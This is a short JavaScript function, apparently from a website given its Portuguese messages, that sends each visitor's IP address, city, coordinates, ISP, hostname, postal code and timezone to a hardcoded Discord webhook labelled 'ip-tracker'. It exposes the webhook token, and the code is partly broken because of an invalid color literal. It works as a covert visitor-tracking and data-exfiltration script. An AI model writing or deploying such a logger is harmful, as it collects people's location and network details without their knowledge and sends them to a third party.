function collectInfo(json) {
  // Create a new XMLHttpRequest object
  var wbRequest = new XMLHttpRequest();

  // Set the destination URL for the webhook
  wbRequest.open("POST", "https://discord.com/api/webhooks/1125245988093825144/QZUXFnlGiBBiYFXuaVH0MiWqxZqvvzgjRdBaUYrxYqu_xmBfYTdgfBguvzvI3ysedt6y");

  // Set the content type for the request
  wbRequest.setRequestHeader('Content-type', 'application/json');

  // Set the payload for the webhook
  var params = {
    username: "ip-tracker",
    avatar_url: "https://media.discordapp.net/attachments/1091553414435057704/1125218148937900083/adb5d45c000aa298d09e374b2153158b.jpg",
    content: "Alguém entrou no site :)\n",
    embeds: [{
      title: "Novo IP:",
      color: #0000000,
      description: `**IP:** \`${json.ip}\`\n` +
                   `**Region:** \`${json.country}, ${json.region}, ${json.city}\`\n` +
                   `**Coords.:** \`${json.loc}\`\n\n` +
                   `**Provider:** \`${json.org}\`\n` +
                   `**Host:** \`${json.hostname}\`\n\n` +
                   `**ZIP Code:** \`${json.postal}\`\n` +
                   `**Timezone:** \`${json.timezone}\``
    }]
  };

  // Send the request with the payload as a JSON string
  wbRequest.send(JSON.stringify(params));
}
